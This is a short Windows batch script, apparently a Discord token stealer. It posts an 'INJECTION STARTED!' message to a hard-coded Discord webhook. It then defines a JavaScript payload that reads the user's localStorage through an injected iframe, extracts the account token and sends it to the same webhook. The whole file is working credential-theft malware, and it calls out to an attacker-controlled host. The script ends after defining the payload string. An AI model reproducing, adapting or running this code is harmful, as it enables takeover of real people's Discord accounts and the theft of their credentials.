@echo off
C:/temp/curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**INJECTION STARTED!**\"}" https://discord.com/api/webhooks/865402038358376459/ABhLdsR67vWOZID4gudQFmU7_8Gc747t6gzlGpk8BP7ufbq2XUfwMw7O9WSdrOD5RVlM
set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/865402038358376459/ABhLdsR67vWOZID4gudQFmU7_8Gc747t6gzlGpk8BP7ufbq2XUfwMw7O9WSdrOD5RVlM', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
